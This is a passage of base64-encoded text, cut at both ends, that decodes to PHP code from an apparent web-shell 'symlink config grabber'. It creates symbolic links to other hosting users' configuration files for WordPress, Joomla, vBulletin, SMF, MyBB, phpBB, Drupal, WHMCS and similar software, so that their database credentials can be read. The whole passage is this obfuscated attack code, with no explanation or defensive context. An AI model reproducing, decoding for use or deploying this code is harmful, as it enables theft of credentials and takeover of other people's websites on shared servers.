R1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtdGVzdC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5pbmknKSA7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28uaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RpbmcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1aQ3Nob3AuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRwZG9tYWluLid+fj5tay1wb3J0YWxlMS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3NtZi9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1zbWYuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW0uaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC91cGxvYWQvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dXBsb2FkLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbC9jb25maWcucGhwJywkZG9tYWluLid+fj5tYWxheS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnMi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJGRvbWFpbi4nfj5EcnVwYWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2RhdGFzL2NvbmZpZy5waHAnLCRkb21haW4uJ34+U2VkaXRpby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi5pbmknKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi1mb3J1bS5pbmknKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci5pbmknKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8uaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LmluaScpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0uaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIuaW5pJyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21ha
